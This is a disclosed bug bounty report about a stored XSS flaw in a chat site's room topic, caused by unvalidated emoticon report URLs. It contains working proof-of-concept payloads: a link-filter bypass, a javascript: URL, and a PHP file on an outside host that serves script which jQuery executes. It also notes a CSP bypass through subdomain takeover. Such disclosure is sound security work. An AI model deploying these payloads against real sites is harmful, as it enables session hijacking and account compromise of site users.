# Stored XSS in chat topic due to insecure emoticon parsing on any message type

## Report Details
- **Report ID**: 429298
- **URL**: https://hackerone.com/reports/429298
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-10-26T14:38:18.693Z
- **Disclosed**: 2018-11-01T20:22:29.144Z

## Reporter
- **Username**: avlidienbrunn
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: chaturbate

## Vulnerability Information
## Description

The funcitonality for adding emoticons into the chat from the serverside perspective is based on a string in the following format:

```
%%%[emoticon NAME|EMOTICON_URL|WIDTH|HEIGHT|REPORT_URL]%%%
```

The `EMOTICON_URL` must conform to the following regex:
```javascript
/(http|https):\/\/(\w+:{0,1}\w*@)?(\S+)(:[0-9]+)?(\/|\/([\w#!:.?+=&%@!\-\/]))?/g
```

However, the `REPORT_URL` does not have any checks that verifies the URL. This, combined with other issues listed below, leads to stored XSS.

### Chat topic link filter bypass

The chat topic functionality has a filter that removes links from the topic, by removing the string `http`. This can be bypassed by using a string such as `htthttpps` (after replace becomes `https`).

### XSS Via ctrl/mouse3 click and  `javascript:` `REPORT_URL`
By using a `javascript:` URL as `REPORT_URL`, we can create an emoji that, when clicked, will show the "report emoticon" prompt. By ctrl-clicking or mouse3-clicking the `REPORT EMOTICON` link, the XSS triggers.

#### PoC

1. Set topic to `LUL %%%[emoticon blush|htthttpps://public.chaturbate/uploads/avatar/2011/11/08/cxecSeKtWjRK.jpg|22|22|javascript:alert(1)]%%% WUT`
2. Click emoticon
3. Ctrl/mouse3 click `REPORT EMOTICON`

{F366518}

### XSS Via emoticon report due to insecure usage of jQuery $.ajax()

The functionality for reporting an emoticon sends an AJAX request to `REPORT_URL`. This leads to XSS due to the fact that jQuery will treat any `application/javascript` response as javascript and will evaluate the response.

#### PoC

1. Set topic to `LUL %%%[emoticon blush|htthttpps://public.chaturbate/uploads/avatar/2011/11/08/cxecSeKtWjRK.jpg|22|22|htthttpps://avlidienbrunn.se/xss.php]%%% WUT`
2. Click emoticon
3. Click `REPORT EMOTICON`
4. Click `REPORT`

{F366520}

Contents of `xss.php`:
```php
<?php
header('Content-Type: text/javascript');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Headers: X-Requested-With, connectUrl, X-CSRFToken');
?>
alert(document.domain);
```

### Notes

**CSP**
The reason the second XSS issue does not work in CSP enabled browsers is that no domain in my control is allowed by the `connect-src` directive. However, several `*.DOMAIN.COM` are included in `connect-src`:
```javascript
https://*.highwebmedia.com
https://*.chaturbate.com
https://*.hotjar.com:*
```
This means this issue can be exploited if a [subdomain takeover](https://www.hacker101.com/vulnerabilities/subdomain_takeover.html) bug exists in any of those domains. Obviously I can't test for that, but it's an important note regarding impact.

**Other exploitation areas**
The only place where I could find that didn't respond with a server error when using `%%%[emoticon ]%%%` was the room topic. However, if there is any other type of message that allows this string, that would be vulnerable as well, since the emoticon parsing functionality is ran on all messages.

## Impact

Stored XSS on chaturbate.com with 2 click interaction.

Exploitation by using an offensive image in `EMOTICON_URL` using XSS payload in `REPORT_URL`. It's also possible to create an emoticon that covers the whole chat window by using a large value in `WIDTH` and `HEIGHT`:

{F366528}

## Attachments
- Screen_Shot_2018-10-26_at_16.04.31.png
- Screen_Shot_2018-10-26_at_16.18.37.png
- Screen_Shot_2018-10-26_at_16.37.56.png
